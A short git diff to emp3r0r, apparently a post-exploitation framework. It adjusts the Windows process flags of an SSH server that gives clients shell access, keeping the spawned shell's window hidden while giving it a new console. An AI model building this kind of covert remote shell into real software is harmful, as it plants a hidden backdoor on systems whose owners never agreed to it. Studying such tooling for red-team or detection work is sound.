@@ -13,6 +13,7 @@ import (
 	"github.com/gliderlabs/ssh"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/shirou/gopsutil/v3/process"
+	"golang.org/x/sys/windows"
 )
 
 // SSHD start a ssh server to provide shell access for clients
@@ -42,7 +43,8 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		cmd.Stdout = s
 
 		cmd.SysProcAttr = &syscall.SysProcAttr{
-			HideWindow: true,
+			HideWindow:    true,
+			CreationFlags: windows.CREATE_NEW_CONSOLE,
 		}
 		ctx, cancel := context.WithCancel(context.Background())
 		defer cancel()
